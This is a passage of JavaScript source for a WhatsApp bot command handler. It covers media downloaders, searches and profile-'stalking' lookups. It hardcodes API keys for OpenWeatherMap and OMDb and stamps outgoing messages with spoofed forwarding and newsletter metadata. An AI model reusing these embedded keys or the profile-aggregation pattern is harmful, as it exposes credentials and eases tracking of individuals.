if (!text) return replygcaespisp(`*Contih : ${prefix+command} https://youtu.be/a3sp1b0tz`)
	await aespispStickWait()
let nangisbgh = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${text}`)
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*DONE JOIN GROUP JB KU https://linktr.ee/arielstore2072*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ video : { url : nangisbgh.result.result }}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'git': case 'gitclone':
if (!args[0]) return replygcaespisp(`Where is the link?\nExample :\n${prefix}${command} https://github.com/ArielSProject/ArielFolder`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcaespisp(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ArielStore.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: ftroli }).catch((err) => replygcaespisp(mess.error))
break
case'tiktok':{
if (!text) return replygcaespisp(`Use it by the way: ${prefix+command} *query*\n\n_Example_\n\n${prefix+command} khaby lame`)
ArielStore.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${text}`)
const capt = anu.result.caption
await ArielStore.sendMessage(m.chat, { video: { url: anu.result.hd.url }, caption: `🔖TITLE : ${capt}`}, {quoted: m})
await ArielStore.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}catch (error) {
replygcaespisp(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
break
case 'instagramvideo': case 'igvideo': case 'igvid': {
if (!text) return replygcaespisp(`Contoh : https://instagram.com/reels/02381029jsjaia`)
await aespispStickWait()
let nangisbg = await fetchJson(`https://api.junn4.my.id/download/ighighlight?url=${text}`)
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*DONE JOIN GROUP JB KU https://linktr.ee/arielstore2072*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ video : { url : nangisbg.result }}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'instagramimage': case 'igimage': case 'igfoto': case 'igimg': {
if (!text) return replygcaespisp(`Contoh : https://instagram.com/aespibotz`)
await aespispStickWait()
let nangisbg = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${text}`)
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*DONE JOIN GROUP JB KU https://linktr.ee/arielstore2072*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : { url : nangisbg.result.media }}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'tiktokvideo':
case 'tiktokmp4': {
if (!q) return replygcaespisp( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcaespisp(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
ArielStore.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokmp3':
case 'tiktokaudio':{
if (!q) return replygcaespisp( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replygcaespisp(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
const aespisptikmp3 = {url:data.audio}
ArielStore.sendMessage(m.chat, { audio: aespisptikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: ftroli })
})
}
break
case'ttslide': case 'tiktokslide':{
if (!text) return replygcaespisp(`Use it by the way ${prefix+command} *url*\n\n_Example_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
ArielStore.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktokslide?url=${text}`)
await ArielStore.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ``}, {quoted: m})
await ArielStore.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await ArielStore.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'google': {
if (!q) return replygcaespisp(`Example : ${prefix + command} ${botname}`)
await aespispStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replygcaespisp(teks)
})
}
break
case 'weather':{
if (!text) return replygcaespisp('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           ArielStore.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'facebook2': case 'fb2':{
if (!text) return replygcaespisp(`Enter the link!!!`)
if (!isUrl(args[0])) return replygcaespisp(`Where is the link?`)
await ArielStore.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
try{
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${text}`)
ArielStore.sendMessage(m.chat, { video: { url: anu.result.video_hd }, caption: 'Here you go!' }, { quoted: ftroli })
await ArielStore.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await ArielStore.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
           case 'fb':
           case 'facebook':
case 'facebookvid': {
           if (!args[0]) {
    return replygcaespisp(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replygcaespisp('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    ArielStore.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replygcaespisp('Maybe private video!')
  }
  }
  break
case 'tiktokstalk': {
	  if (!text) return replygcaespisp(`Username? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
  await ArielStore.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
case 'xxxigstalk': {
if (!text) return replygcaespisp(`Enter Instagram Username\n\nExample: ${prefix + command} unicorn_aespisp13`)
    let res = await fg.igStalk(text)
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await ArielStore.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcaespisp(`Example ${prefix+command} DGaespisp`)
await aespispStickWait()
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
ArielStore.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return replygcaespisp(`Example ${prefix+command} aespispapi`)
await aespispStickWait()
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
replygcaespisp(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return replygcaespisp(`Example ${prefix+command} 946716486`)
await aespispStickWait()
let ffstalk = require('./lib/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
replygcaespisp(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!q) return replygcaespisp(`Example ${prefix+command} 530793138|8129`)
await aespispStickWait()
let mlstalk = require('./lib/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcaespisp(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'spotify':{
	if (!text) return replygcaespisp(`*Contih : ${prefix+command} https://open.spotify.com/track/5XeFesFbtLpXzIVDNQP22n?si=cPstQmUUSXugNDWWl6DmLg*`)
	await aespispStickWait()
let nangisbg = await fetchJson(`https://api.junn4.my.id/download/spotify?url=${text}`)
ArielStore.sendMessage(m.chat, { audio : { url : nangisbg.data.download }, mimetype: 'audio/mp4', ptt: true}, {quoted: ftroli})
}
break
case 'imdb':
if (!text) return replygcaespisp(`_Name a Series or movie`)
await aespispStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           ArielStore.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'ebinary': {
if (!q) return replygcaespisp(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
replygcaespisp(eb)
}
break
case 'dbinary': {
if (!q) return replygcaespisp(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
replygcaespisp(db)
}
break
case 'happymod':{
if (!q) return replygcaespisp(`Example ${prefix+command} Sufway surfer mod`)
await aespispStickWait()
let kat = await scp2.happymod(q)
replygcaespisp(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return replygcaespisp(`Enter the Google Drive link`)
	await aespispStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcaespisp(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	ArielStore.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: ftroli })
   } catch {
	replygcaespisp('Error: Check link or try another link') 
  }
}
break
case 'pinterest': case 'pin': {
  if (!text) return replygcaespisp(`Title?`);
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: ArielStore.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Randomize arrays
  let ult = res.splice(0, 5); // Takes the first 10 images from a randomized array
  let i = 1;
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `_*Here is the result of: ${text}*_`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: botname
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `Image - ${i++}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});
  await ArielStore.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break
case 'pinterest2': {
if (!text) return replygcaespisp(`Use example ${prefix+ command} one piece`)
    const { googleImage } = require('@bochilteam/scraper')
    const anutrest = await googleImage(text)
    let image = anutrest[Math.floor(Math.random() * anutrest.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: image } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'ringtone': {
		if (!text) return replygcaespisp(`Example : ${prefix + command} black rover`)
        let { ringtone }= require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		ArielStore.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: ftroli })
	    }
	    break
case 'chinese':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'hijab':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'indo':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'japanese':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'korean':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'malay':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
